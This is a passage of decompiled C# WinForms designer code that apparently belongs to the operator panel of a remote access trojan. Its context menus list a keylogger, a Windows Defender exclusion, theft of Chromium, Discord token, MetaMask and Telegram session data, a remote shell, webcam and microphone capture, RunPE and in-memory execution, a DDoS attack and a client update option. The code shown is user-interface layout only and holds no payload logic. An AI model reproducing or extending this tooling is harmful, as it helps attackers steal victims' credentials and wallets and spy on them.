		this.RestartToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RestartToolStripMenuItem1.Image");
		this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
		this.RestartToolStripMenuItem1.Size = new System.Drawing.Size(110, 22);
		this.RestartToolStripMenuItem1.Text = "Restart";
		this.ExitToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ExitToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ExitToolStripMenuItem.Image");
		this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
		this.ExitToolStripMenuItem.Size = new System.Drawing.Size(110, 22);
		this.ExitToolStripMenuItem.Text = "Exit";
		this.performanceCounter2.CategoryName = "Memory";
		this.performanceCounter2.CounterName = "% Committed Bytes In Use";
		this.performanceCounter1.CategoryName = "Processor";
		this.performanceCounter1.CounterName = "% Processor Time";
		this.performanceCounter1.InstanceName = "_Total";
		this.ii.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ii.ImageStream");
		this.ii.TransparentColor = System.Drawing.Color.Transparent;
		this.TimerTask.Enabled = true;
		this.TimerTask.Interval = 5000;
		this.ThumbnailCap.Interval = 5000;
		this.ImageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
		this.ImageList1.ImageSize = new System.Drawing.Size(256, 156);
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.Lv4.BackColor = System.Drawing.Color.White;
		this.Lv4.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.Lv4.ContextMenuStrip = this.Guna2ContextMenuStrip2_1;
		this.Lv4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Lv4.ForeColor = System.Drawing.Color.Black;
		this.Lv4.HideSelection = false;
		this.Lv4.LargeImageList = this.ImageList1;
		this.Lv4.Location = new System.Drawing.Point(73, 33);
		this.Lv4.Name = "Lv4";
		this.Lv4.Size = new System.Drawing.Size(842, 390);
		this.Lv4.TabIndex = 7;
		this.Lv4.UseCompatibleStateImageBehavior = false;
		this.Guna2ContextMenuStrip2_1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripMenuItem4, this.ToolStripMenuItem6 });
		this.Guna2ContextMenuStrip2_1.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2_1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2_1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_1.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2_1.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2_1.Size = new System.Drawing.Size(113, 48);
		this.ToolStripMenuItem4.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem4.Image");
		this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
		this.ToolStripMenuItem4.Size = new System.Drawing.Size(112, 22);
		this.ToolStripMenuItem4.Text = "[ Start ]";
		this.ToolStripMenuItem6.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem6.Image");
		this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
		this.ToolStripMenuItem6.Size = new System.Drawing.Size(112, 22);
		this.ToolStripMenuItem6.Text = "[ Stop ]";
		this.ImageList2.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
		this.ImageList2.ImageSize = new System.Drawing.Size(16, 16);
		this.ImageList2.TransparentColor = System.Drawing.Color.Transparent;
		this.Guna2Panel2.Controls.Add(this.Guna2TextBox1);
		this.Guna2Panel2.Controls.Add(this.Guna2Panel3);
		this.Guna2Panel2.Controls.Add(this.Guna2Panel4);
		this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel2.Location = new System.Drawing.Point(0, 4);
		this.Guna2Panel2.Name = "Guna2Panel2";
		this.Guna2Panel2.Size = new System.Drawing.Size(915, 25);
		this.Guna2Panel2.TabIndex = 27;
		this.Guna2TextBox1.Animated = true;
		this.Guna2TextBox1.BorderRadius = 4;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.IconLeft = (System.Drawing.Image)resources.GetObject("Guna2TextBox1.IconLeft");
		this.Guna2TextBox1.Location = new System.Drawing.Point(57, 0);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderText = "Search";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(801, 25);
		this.Guna2TextBox1.TabIndex = 25;
		this.Guna2TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.Guna2Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Guna2Panel3.Location = new System.Drawing.Point(0, 0);
		this.Guna2Panel3.Name = "Guna2Panel3";
		this.Guna2Panel3.Size = new System.Drawing.Size(57, 25);
		this.Guna2Panel3.TabIndex = 27;
		this.Guna2Panel4.Dock = System.Windows.Forms.DockStyle.Right;
		this.Guna2Panel4.Location = new System.Drawing.Point(858, 0);
		this.Guna2Panel4.Name = "Guna2Panel4";
		this.Guna2Panel4.Size = new System.Drawing.Size(57, 25);
		this.Guna2Panel4.TabIndex = 28;
		this.Guna2Panel6.Controls.Add(this.Guna2Button7);
		this.Guna2Panel6.Controls.Add(this.Guna2Button6);
		this.Guna2Panel6.Controls.Add(this.Guna2Button5);
		this.Guna2Panel6.Controls.Add(this.Guna2Button4);
		this.Guna2Panel6.Controls.Add(this.Guna2Button3);
		this.Guna2Panel6.Controls.Add(this.Guna2Button2);
		this.Guna2Panel6.Controls.Add(this.Guna2Button1);
		this.Guna2Panel6.Dock = System.Windows.Forms.DockStyle.Left;
		this.Guna2Panel6.Location = new System.Drawing.Point(0, 33);
		this.Guna2Panel6.Name = "Guna2Panel6";
		this.Guna2Panel6.Size = new System.Drawing.Size(73, 390);
		this.Guna2Panel6.TabIndex = 36;
		this.Guna2Button7.BorderRadius = 6;
		this.Guna2Button7.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button7.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button7.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button7.FillColor = System.Drawing.Color.White;
		this.Guna2Button7.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button7.ForeColor = System.Drawing.Color.White;
		this.Guna2Button7.Image = (System.Drawing.Image)resources.GetObject("Guna2Button7.Image");
		this.Guna2Button7.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button7.Location = new System.Drawing.Point(3, 163);
		this.Guna2Button7.Name = "Guna2Button7";
		this.Guna2Button7.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button7.TabIndex = 6;
		this.Guna2Button6.BorderRadius = 6;
		this.Guna2Button6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button6.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button6.FillColor = System.Drawing.Color.White;
		this.Guna2Button6.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button6.ForeColor = System.Drawing.Color.White;
		this.Guna2Button6.Image = (System.Drawing.Image)resources.GetObject("Guna2Button6.Image");
		this.Guna2Button6.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button6.Location = new System.Drawing.Point(3, 200);
		this.Guna2Button6.Name = "Guna2Button6";
		this.Guna2Button6.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button6.TabIndex = 5;
		this.Guna2Button5.BorderRadius = 6;
		this.Guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button5.FillColor = System.Drawing.Color.White;
		this.Guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button5.ForeColor = System.Drawing.Color.White;
		this.Guna2Button5.Image = (System.Drawing.Image)resources.GetObject("Guna2Button5.Image");
		this.Guna2Button5.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button5.Location = new System.Drawing.Point(3, 237);
		this.Guna2Button5.Name = "Guna2Button5";
		this.Guna2Button5.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button5.TabIndex = 4;
		this.Guna2Button4.BorderRadius = 6;
		this.Guna2Button4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button4.FillColor = System.Drawing.Color.White;
		this.Guna2Button4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button4.ForeColor = System.Drawing.Color.White;
		this.Guna2Button4.Image = (System.Drawing.Image)resources.GetObject("Guna2Button4.Image");
		this.Guna2Button4.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button4.Location = new System.Drawing.Point(3, 126);
		this.Guna2Button4.Name = "Guna2Button4";
		this.Guna2Button4.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button4.TabIndex = 3;
		this.Guna2Button3.BorderRadius = 6;
		this.Guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button3.FillColor = System.Drawing.Color.White;
		this.Guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button3.ForeColor = System.Drawing.Color.White;
		this.Guna2Button3.Image = (System.Drawing.Image)resources.GetObject("Guna2Button3.Image");
		this.Guna2Button3.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button3.Location = new System.Drawing.Point(3, 89);
		this.Guna2Button3.Name = "Guna2Button3";
		this.Guna2Button3.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button3.TabIndex = 2;
		this.Guna2Button2.BorderRadius = 6;
		this.Guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button2.FillColor = System.Drawing.Color.White;
		this.Guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button2.ForeColor = System.Drawing.Color.White;
		this.Guna2Button2.Image = (System.Drawing.Image)resources.GetObject("Guna2Button2.Image");
		this.Guna2Button2.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button2.Location = new System.Drawing.Point(3, 52);
		this.Guna2Button2.Name = "Guna2Button2";
		this.Guna2Button2.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button2.TabIndex = 1;
		this.Guna2Button1.BorderRadius = 6;
		this.Guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2Button1.FillColor = System.Drawing.Color.White;
		this.Guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2Button1.ForeColor = System.Drawing.Color.White;
		this.Guna2Button1.Image = (System.Drawing.Image)resources.GetObject("Guna2Button1.Image");
		this.Guna2Button1.ImageSize = new System.Drawing.Size(19, 19);
		this.Guna2Button1.Location = new System.Drawing.Point(3, 15);
		this.Guna2Button1.Name = "Guna2Button1";
		this.Guna2Button1.Size = new System.Drawing.Size(67, 31);
		this.Guna2Button1.TabIndex = 0;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripMenuItem7 });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(116, 26);
		this.ToolStripMenuItem7.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem7.Image");
		this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
		this.ToolStripMenuItem7.Size = new System.Drawing.Size(115, 22);
		this.ToolStripMenuItem7.Text = "[ Clear ]";
		this.Guna2ContextMenuStrip2_2.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.FromDiskToolStripMenuItem, this.FromLinkToolStripMenuItem, this.FromMemoryToolStripMenuItem1, this.OpenUrlToolStripMenuItem2, this.KeyloggerToolStripMenuItem, this.WDExclusionToolStripMenuItem1, this.RecoveryToolStripMenuItem1, this.UpdateAllClientsToolStripMenuItem1, this.RemoveTaskToolStripMenuItem1 });
		this.Guna2ContextMenuStrip2_2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2_2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2_2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2_2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2_2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2_2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2_2.Size = new System.Drawing.Size(166, 202);
		this.FromDiskToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FromDiskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FromDiskToolStripMenuItem.Image");
		this.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem";
		this.FromDiskToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
		this.FromDiskToolStripMenuItem.Text = "[ From Disk ]";
		this.FromLinkToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FromLinkToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FromLinkToolStripMenuItem.Image");
		this.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem";
		this.FromLinkToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
		this.FromLinkToolStripMenuItem.Text = "[ From Link ]";
		this.FromMemoryToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FromMemoryToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FromMemoryToolStripMenuItem1.Image");
		this.FromMemoryToolStripMenuItem1.Name = "FromMemoryToolStripMenuItem1";
		this.FromMemoryToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
		this.FromMemoryToolStripMenuItem1.Text = "[ From Memory ]";
		this.OpenUrlToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.OpenUrlToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.VisibleToolStripMenuItem2, this.InvisibleToolStripMenuItem2 });
		this.OpenUrlToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("OpenUrlToolStripMenuItem2.Image");
		this.OpenUrlToolStripMenuItem2.Name = "OpenUrlToolStripMenuItem2";
		this.OpenUrlToolStripMenuItem2.Size = new System.Drawing.Size(165, 22);
		this.OpenUrlToolStripMenuItem2.Text = "[ Open Url ]";
		this.VisibleToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.VisibleToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("VisibleToolStripMenuItem2.Image");
		this.VisibleToolStripMenuItem2.Name = "VisibleToolStripMenuItem2";
		this.VisibleToolStripMenuItem2.Size = new System.Drawing.Size(131, 22);
		this.VisibleToolStripMenuItem2.Text = "[ Visible ]";
		this.InvisibleToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.InvisibleToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("InvisibleToolStripMenuItem2.Image");
		this.InvisibleToolStripMenuItem2.Name = "InvisibleToolStripMenuItem2";
		this.InvisibleToolStripMenuItem2.Size = new System.Drawing.Size(131, 22);
		this.InvisibleToolStripMenuItem2.Text = "[ Invisible ]";
		this.KeyloggerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.KeyloggerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("KeyloggerToolStripMenuItem.Image");
		this.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem";
		this.KeyloggerToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
		this.KeyloggerToolStripMenuItem.Text = "[ Keylogger ]";
		this.WDExclusionToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.WDExclusionToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("WDExclusionToolStripMenuItem1.Image");
		this.WDExclusionToolStripMenuItem1.Name = "WDExclusionToolStripMenuItem1";
		this.WDExclusionToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
		this.WDExclusionToolStripMenuItem1.Text = "[ WDExclusion ]";
		this.RecoveryToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RecoveryToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.RunRecoveryToolStripMenuItem1, this.ChromiumToolStripMenuItem1, this.DiscordTokenToolStripMenuItem1, this.MetaMaskToolStripMenuItem2, this.TelegramSessionToolStripMenuItem1 });
		this.RecoveryToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RecoveryToolStripMenuItem1.Image");
		this.RecoveryToolStripMenuItem1.Name = "RecoveryToolStripMenuItem1";
		this.RecoveryToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
		this.RecoveryToolStripMenuItem1.Text = "[ Recovery ]";
		this.RunRecoveryToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RunRecoveryToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RunRecoveryToolStripMenuItem1.Image");
		this.RunRecoveryToolStripMenuItem1.Name = "RunRecoveryToolStripMenuItem1";
		this.RunRecoveryToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.RunRecoveryToolStripMenuItem1.Text = "[ RunRecovery ]";
		this.ChromiumToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ChromiumToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ChromiumToolStripMenuItem1.Image");
		this.ChromiumToolStripMenuItem1.Name = "ChromiumToolStripMenuItem1";
		this.ChromiumToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.ChromiumToolStripMenuItem1.Text = "[ Chromium ]";
		this.DiscordTokenToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DiscordTokenToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DiscordTokenToolStripMenuItem1.Image");
		this.DiscordTokenToolStripMenuItem1.Name = "DiscordTokenToolStripMenuItem1";
		this.DiscordTokenToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.DiscordTokenToolStripMenuItem1.Text = "[ DiscordToken ]";
		this.MetaMaskToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.MetaMaskToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("MetaMaskToolStripMenuItem2.Image");
		this.MetaMaskToolStripMenuItem2.Name = "MetaMaskToolStripMenuItem2";
		this.MetaMaskToolStripMenuItem2.Size = new System.Drawing.Size(175, 22);
		this.MetaMaskToolStripMenuItem2.Text = "[ MetaMask ]";
		this.TelegramSessionToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.TelegramSessionToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("TelegramSessionToolStripMenuItem1.Image");
		this.TelegramSessionToolStripMenuItem1.Name = "TelegramSessionToolStripMenuItem1";
		this.TelegramSessionToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.TelegramSessionToolStripMenuItem1.Text = "[ TelegramSession ]";
		this.UpdateAllClientsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UpdateAllClientsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UpdateAllClientsToolStripMenuItem1.Image");
		this.UpdateAllClientsToolStripMenuItem1.Name = "UpdateAllClientsToolStripMenuItem1";
		this.UpdateAllClientsToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
		this.UpdateAllClientsToolStripMenuItem1.Text = "[ Update Clients ]";
		this.RemoveTaskToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RemoveTaskToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RemoveTaskToolStripMenuItem1.Image");
		this.RemoveTaskToolStripMenuItem1.Name = "RemoveTaskToolStripMenuItem1";
		this.RemoveTaskToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
		this.RemoveTaskToolStripMenuItem1.Text = "[ RemoveTask ]";
		this.Guna2ContextMenuStrip2_3.Items.AddRange(new System.Windows.Forms.ToolStripItem[28]
		{
			this.InformationToolStripMenuItem1, this.MonitorToolStripMenuItem, this.RunFileToolStripMenuItem, this.WebCamToolStripMenuItem1, this.MicrophoneToolStripMenuItem1, this.SystemSoundToolStripMenuItem1, this.OpenUrlToolStripMenuItem1, this.OptionsToolStripMenuItem, this.ShellToolStripMenuItem, this.FileManagerToolStripMenuItem1,
			this.RecoveryOptionsToolStripMenuItem, this.RegistryEditorToolStripMenuItem1, this.ActiveWindowsToolStripMenuItem1, this.TCPConnectionsToolStripMenuItem, this.StartupManagerToolStripMenuItem1, this.ProcessManagerToolStripMenuItem1, this.ServiceManagerToolStripMenuItem1, this.ClipboardManagerToolStripMenuItem1, this.InstalledProgramsToolStripMenuItem1, this.VBNetCompilerToolStripMenuItem1,
			this.DDosAttackToolStripMenuItem1, this.LocationManagerToolStripMenuItem, this.PastimeToolStripMenuItem1, this.PowerToolStripMenuItem2, this.Extra1ToolStripMenuItem, this.Extra2ToolStripMenuItem1, this.ClientToolStripMenuItem1, this.ClientFolderToolStripMenuItem
		});
		this.Guna2ContextMenuStrip2_3.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2_3.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2_3.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_3.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2_3.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2_3.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_3.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2_3.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_3.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_3.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2_3.Size = new System.Drawing.Size(191, 642);
		this.InformationToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.InformationToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("InformationToolStripMenuItem1.Image");
		this.InformationToolStripMenuItem1.Name = "InformationToolStripMenuItem1";
		this.InformationToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.InformationToolStripMenuItem1.Text = "[ Information ]";
		this.MonitorToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.MonitorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("MonitorToolStripMenuItem.Image");
		this.MonitorToolStripMenuItem.Name = "MonitorToolStripMenuItem";
		this.MonitorToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.MonitorToolStripMenuItem.Text = "[ Monitor ]";
		this.RunFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RunFileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.DiskToolStripMenuItem, this.LinkToolStripMenuItem, this.MemoryToolStripMenuItem1, this.RunPEToolStripMenuItem2 });
		this.RunFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunFileToolStripMenuItem.Image");
		this.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem";
		this.RunFileToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.RunFileToolStripMenuItem.Text = "[ Run File ]";
		this.DiskToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.DiskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DiskToolStripMenuItem.Image");
		this.DiskToolStripMenuItem.Name = "DiskToolStripMenuItem";
		this.DiskToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
		this.DiskToolStripMenuItem.Text = "[ Disk ]";
		this.LinkToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.LinkToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LinkToolStripMenuItem.Image");
		this.LinkToolStripMenuItem.Name = "LinkToolStripMenuItem";
		this.LinkToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
		this.LinkToolStripMenuItem.Text = "[ Link ]";
		this.MemoryToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.MemoryToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("MemoryToolStripMenuItem1.Image");
		this.MemoryToolStripMenuItem1.Name = "MemoryToolStripMenuItem1";
		this.MemoryToolStripMenuItem1.Size = new System.Drawing.Size(133, 22);
		this.MemoryToolStripMenuItem1.Text = "[ Memory ]";
		this.RunPEToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.RunPEToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("RunPEToolStripMenuItem2.Image");
		this.RunPEToolStripMenuItem2.Name = "RunPEToolStripMenuItem2";
		this.RunPEToolStripMenuItem2.Size = new System.Drawing.Size(133, 22);
